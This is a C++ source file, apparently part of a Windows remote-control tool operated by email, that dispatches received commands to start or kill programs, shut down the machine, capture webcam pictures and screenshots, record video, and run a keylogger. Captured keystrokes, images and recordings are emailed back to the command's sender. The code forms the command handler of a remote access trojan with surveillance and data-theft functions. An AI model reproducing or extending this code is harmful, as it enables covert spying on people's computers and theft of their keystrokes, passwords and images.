#include "executeCommand.h"

using namespace std;

thread_local string g_current_sender;  // người nhận hiện tại

static string trim_command_internal(string command) {
  command.erase(command.begin(), find_if(command.begin(), command.end(),
                                        [](int ch) { return !isspace(ch); }));
  command.erase(find_if(command.rbegin(), command.rend(),
                        [](int ch) { return !isspace(ch); })
                    .base(),
                command.end());
  return command;
}

void handle_start_program(const string& command) {
  string prog = command.substr(13);  // After "start_program"
  prog.erase(prog.begin(), find_if(prog.begin(), prog.end(),
                                  [](int ch) { return !isspace(ch); }));

  if (!prog.empty()) {
    cout << "Starting program: " << prog << endl;
    HINSTANCE result =
        ShellExecuteA(NULL, "open", prog.c_str(), NULL, NULL, SW_SHOWDEFAULT);
    if (reinterpret_cast<INT_PTR>(result) <= 32) {
      cerr << "Failed to start program. Error code: "
          << reinterpret_cast<INT_PTR>(result) << endl;
      if (!g_current_sender.empty()) {
        send_email_with_attachment(g_current_sender, "start_program failed",
                                  "Failed to start: " + prog, "");
      }
    } else {
      if (!g_current_sender.empty()) {
        send_email_with_attachment(g_current_sender, "start_program succeeded",
                                  "Started program: " + prog, "");
      }
    }
  } else if (!g_current_sender.empty()) {
    send_email_with_attachment(g_current_sender, "start_program",
                              "No program specified.", "");
  }
}

void handle_shutdown_program(const string& command) {
  string proc = command.substr(16);
  proc.erase(proc.begin(), find_if(proc.begin(), proc.end(),
                                  [](int ch) { return !isspace(ch); }));

  if (!proc.empty()) {
    shutdown_program(proc);
    if (!g_current_sender.empty()) {
      send_email_with_attachment(g_current_sender, "shutdown_program",
                                "Shutdown program: " + proc, "");
    }
  } else if (!g_current_sender.empty()) {
    send_email_with_attachment(g_current_sender, "shutdown_program",
                              "No process specified.", "");
  }
}

void handle_get_picture() {
  send_picture();  // tự gửi hình trong đó
                  // send_picture() hiện gửi luôn mail; không cần gửi thêm
}

void handle_get_screenshot() {
  send_screenshot();  // tự gửi mail
}

void handle_list_programs() {
  list_programs();  // tự gửi mail
}

void handle_shutdown() {
  cout << "Initiating system shutdown..." << endl;
  if (system("shutdown /s /t 0") != 0) {
    cerr << "Shutdown command failed" << endl;
    if (!g_current_sender.empty()) {
      send_email_with_attachment(g_current_sender, "shutdown",
                                "Shutdown command failed", "");
    }
  } else if (!g_current_sender.empty()) {
    send_email_with_attachment(g_current_sender, "shutdown",
                              "Shutdown initiated", "");
  }
}

void handle_keylogger(const string& command) {
  istringstream iss(command);
  string cmd;
  int duration = 10;
  iss >> cmd >> duration;

  cout << "Starting keylogger for " << duration << " seconds..." << endl;
  start_keylogger("keylog.txt", duration);
  if (!g_current_sender.empty()) {
    send_email_with_attachment(g_current_sender, "Keylogger output",
                              "Attached keylog", "keylog.txt");
  }
}

void handle_start_recording() {
  cout << "Starting recording..." << endl;
  start_recording();
  if (!g_current_sender.empty()) {
    send_email_with_attachment(g_current_sender, "Recording Started",
                              "Video recording has been started.", "");
  }
}

void handle_stop_recording() {
  cout << "Stopping recording..." << endl;
  stop_and_send_recording();  // This function sends the video via email internally
}

void execute_command(const string& command) {
  cout << "[Command]: " << command << endl;

  string trimmed_cmd = trim_command_internal(command);
  if (trimmed_cmd.empty()) {
    cout << "Empty command received" << endl;
    return;
  }

  if (trimmed_cmd.find("start_program") == 0) {
    handle_start_program(trimmed_cmd);
  } else if (trimmed_cmd.find("shutdown_program") == 0) {
    handle_shutdown_program(trimmed_cmd);
  } else if (trimmed_cmd.find("get_picture") == 0) {
    handle_get_picture();
  } else if (trimmed_cmd.find("get_screenshot") == 0) {
    handle_get_screenshot();
  } else if (trimmed_cmd.find("list_program") == 0) {
    handle_list_programs();
  } else if (trimmed_cmd.find("shutdown") == 0) {
    handle_shutdown();
  } else if (trimmed_cmd.find("keylogger") == 0) {
    handle_keylogger(trimmed_cmd);
  } else if (trimmed_cmd.find("start_recording") == 0) {
    handle_start_recording();
  } else if (trimmed_cmd.find("stop_recording") == 0) {
    handle_stop_recording();
  } else {
    cout << "Unknown command: " << trimmed_cmd << endl;
    if (!g_current_sender.empty()) {
      send_email_with_attachment(g_current_sender, "Unknown command",
                                "Received unknown command: " + trimmed_cmd,
                                "");
    }
  }
}

void execute_command_with_sender(const string& sender, const string& command) {
  g_current_sender = sender;
  execute_command(command);
  g_current_sender.clear();
}